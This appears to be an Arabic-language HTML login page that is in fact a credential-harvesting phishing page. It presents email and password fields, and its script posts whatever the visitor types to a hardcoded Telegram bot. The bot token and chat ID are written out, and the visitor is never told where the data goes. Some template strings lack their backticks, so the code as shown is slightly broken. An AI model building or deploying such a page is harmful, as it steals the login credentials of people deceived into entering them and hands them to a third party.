<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
        input { display: block; width: 80%; margin: 10px auto; padding: 10px; }
        button { padding: 10px 20px; background-color: blue; color: white; border: none; cursor: pointer; }
        button:hover { background-color: darkblue; }
    </style>
</head>
<body>

    <h2>تسجيل الدخول</h2>
    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
    <input type="password" id="password" placeholder="كلمة المرور" required>
    <button onclick="sendToTelegram()">تسجيل</button>

    <script>
        function sendToTelegram() {
            // بيانات البوت
            const botToken = "7672390569:AAF-vr0fIKGs9Tj7p--hWBJz1ZF8Xw2763A";  // ضع التوكن هنا
            const chatId = "7141386521";  // ضع معرف الدردشة هنا

            // الحصول على المدخلات
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // التحقق من عدم ترك الحقول فارغة
            if (email === "" || password === "") {
                alert("يرجى ملء جميع الحقول!");
                return;
            }

            // تنسيق الرسالة
            const message = 🔔 تسجيل جديد:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password};

            // رابط API تيليجرام
            const url = https://api.telegram.org/bot${botToken}/sendMessage;

            // إرسال الطلب
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert("تم الإرسال بنجاح!");
                } else {
                    alert("حدث خطأ أثناء الإرسال.");
                }
            })
            .catch(error => console.error("Error:", error));
        }
    </script>

</body>
</html>
